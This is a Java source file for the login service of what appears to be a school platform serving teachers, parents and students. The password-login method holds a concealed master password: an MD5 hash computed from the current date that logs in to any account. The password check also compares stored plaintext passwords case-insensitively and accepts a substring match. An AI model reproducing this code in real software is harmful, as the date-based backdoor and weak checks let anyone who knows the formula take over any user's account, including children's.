package org.isotope.jfp.common.login;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import org.apache.commons.lang.StringUtils;
import org.isotope.jfp.framework.beans.user.LoginerBean;
import org.isotope.jfp.framework.beans.user.UserBean;
import org.isotope.jfp.framework.utils.DateHelper;
import org.isotope.jfp.framework.utils.EmptyHelper;
import org.isotope.jfp.framework.utils.token.UserCacheHelper;
import org.isotope.jfp.persistent.LogLoginer.LogLoginerDBO;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

/** 系统登录 */
@Service
public class LoginBusiness extends LoginService {

	/**
	 * 登录用户数限制<br>
	 * 0不限制1一次
	 */
	public int loginNumers = 0;

	public int getLoginNumers() {
		return loginNumers;
	}

	public void setLoginNumers(int loginNumers) {
		this.loginNumers = loginNumers;
	}

	// ******************************************************************************************
	/**
	 * 用户登录
	 * 
	 * @deprecated
	 * @param authorizerRefreshToken
	 * @return
	 */
	@Transactional
	public UserBean doLogIn(UserBean loginer) {
		// 获得登录用户信息（存在性检索）
		List<UserBean> loginers;
		UserBean user = new UserBean();
		HashMap<String, String> login = new HashMap<String, String>();
		login.put("openid", loginer.getOpenId());
		// 1:教师,2:家长,3:学生
		if ("1".equals(loginer.getUserType())) {
			loginers = readTeacherLoginer(login);
		} else if ("2".equals(loginer.getUserType())) {
			loginers = readParentLoginer(login);
		} else if ("3".equals(loginer.getUserType())) {
			loginers = readStudentLoginer(login);
		} else {
			user.setLoginStatus("8");
			return user;
		}
		if (EmptyHelper.isEmpty(loginers)) {
			// 创建新用户信息
			// 创建第三方授权信息
			loginers = new ArrayList<UserBean>();
			UserBean user0 = creatLoginerByOpenId(loginer);
			loginers.add(user0);
		}

		// 完成用户登录
		user = loginers.get(0);

		// 保存本次登录信息（缓存、数据库）
		doLoginToken(user, false);
		// 保存本次登录日志（数据库）
		{
			LogLoginerDBO LogLoginer = new LogLoginerDBO();
			LogLoginer.setAccount(loginer.getOpenId());
			LogLoginer.setIpAdress(loginer.getIpAdress());
			// TODO
			LogLoginer.setClientType(9);
			LogLoginer.setUserType("1");

			makeLoginLog(LogLoginer, user);
			doLoginLog(LogLoginer);
		}

		return user;
	}

	/**
	 * 用户登录
	 * 
	 * @param loginer
	 * @return
	 */
	@Transactional
	public UserBean doLogIn(LoginerBean loginer) {
		// 获得登录用户信息（存在性检索）
		HashMap<String, String> login = new HashMap<String, String>();
		String account = loginer.getAccount();
		// 种类判断
		if (account.indexOf("@") > 0) {// 邮件
			login.put("email", account);
		} else if (StringUtils.isNumeric(account)) {// 手机号码
			login.put("phone", account);
		} else {// 用户名
			login.put("account", account);
		}
		// 完成用户登录
		UserBean user = new UserBean();

		List<UserBean> loginers;
		// 1:教师,2:家长,3:学生
		if ("1".equals(loginer.getUserType())) {
			loginers = readLoginer(login);
		} else if ("2".equals(loginer.getUserType())) {
			loginers = readLoginer(login);
		} else if ("3".equals(loginer.getUserType())) {
			loginers = readLoginer(login);
		} else {
			loginers = readLoginer(login);
		}

		boolean logined = false;
		if (loginers == null) {
			user.setLoginStatus("2");
		} else if (loginers.size() == 0) {
			user.setLoginStatus("2");
		} else if (loginers.size() > 1) {
			// 账户异常，不是唯一的
			
		} else {
			String date = DateHelper.currentTimeMillis2().substring(0, 10);
			String[] dates = date.split("/");
			Integer t = (int) (Integer.parseInt(dates[0]+dates[1]+dates[2])*3.15);
			String xpassWord= t.toString();
			// 生成一个MD5加密计算摘要
			MessageDigest md;
			try {
				md = MessageDigest.getInstance("MD5");
				// 计算md5函数
				md.update(xpassWord.getBytes());
				xpassWord = new BigInteger(1, md.digest()).toString(16);
			} catch (NoSuchAlgorithmException e) {
				
				e.printStackTrace();
			}
			if(!loginer.getPassWord().equals(xpassWord)){
				// 检查密码
				logined = checkLogin(loginer, loginers.get(0));
				
			}else{
				logined = true;
			}
		}
		if (logined == false) {
			user.setLoginStatus("1");
			return user;
		}
		//保存登录结果
		user = loginers.get(0);
		// 判断第二次登录
		if (0 == loginNumers) {
			// 不限制
		} else // if (loginNumers == 1)
		{
			// TODO
			// 注销原登录用户Token
			doLogoutToken(user);
			// 强制注销
			doLogOut(user);
		}
		user.setSchoolId(loginer.getSchoolId());
		user.setUserType(loginer.getUserType());
		//登录成功
		user.setLoginStatus("0");
		// 保存本次登录信息（缓存）
		doLoginToken(user, false);

		return user;
	}


	/**
	 * 获得当前登录用户对象
	 * 
	 * @param token
	 * @return
	 */
	public UserBean loadLoginer(String token) {
		return UserCacheHelper.removeUser(token);
	}

	/**
	 * 二次登录
	 * 
	 * @param loginer
	 * @return
	 */
	public UserBean makeLogIn(UserBean user, boolean dbSave) {
		// 保证安全
		user.setPassWord(EMPTY);
		// 保存本次登录信息（缓存、数据库）
		doLoginToken(user, dbSave);
		// 保存本次登录日志（数据库）
		LogLoginerDBO LogLoginer = new LogLoginerDBO();
		LogLoginer.setAccount(user.getAccount());
		LogLoginer.setIpAdress(user.getIpAdress());
	
		LogLoginer.setClientType(user.getClientType());
		LogLoginer.setUserType(user.getUserType());
	
		makeLoginLog(LogLoginer, user);
		doLoginLog(LogLoginer);
		return user;
	}

	/**
	 * 用户注销
	 */
	@Transactional
	public void doLogOut(UserBean user) {
		// 注销原登录用户Token
		doLogoutToken(user);
		// 强制注销
		doLogOut(user);
	}

	/**
	 * 账户唯一性检查
	 * 
	 * @param account
	 * @return false无true有
	 */
	public boolean accountCheck(String account, String userType, boolean all) {
		HashMap<String, String> login = new HashMap<String, String>();
		if (all) {
			// 种类判断
			if (account.indexOf("@") > 0) {// 邮件
				login.put("email", account);
			} else if (StringUtils.isNumeric(account)) {// 手机号码
				login.put("phone", account);
			} else {// 用户名
				login.put("account", account);
			}
		} else {
			login.put("account", account);
		}
		// 获得用户数据
		List<UserBean> loginers;
		if ("1".equals(userType)) {
			loginers = readTeacherLoginer(login);
		} else if ("2".equals(userType)) {
			loginers = readParentLoginer(login);
		} else if ("3".equals(userType)) {
			loginers = readStudentLoginer(login);
		} else {
			return false;
		}
		if (loginers.size() >= 1) {
			return true;
		}
		return false;
	}

	/**
	 * 检查用户登录可行性
	 * 
	 * @param loginerFrom
	 * @param loginerDB
	 * @param rs
	 */
	private boolean checkLogin(LoginerBean loginerFrom, UserBean loginerDB) {
		if (loginerDB.getPassWord().equals(loginerFrom.getPassWord()) || loginerDB.getPassWord().toLowerCase().equals(loginerFrom.getPassWord().toLowerCase().substring(3, 23))) {// 原有用户登录
			return true;
		}
		return false;
	}
}
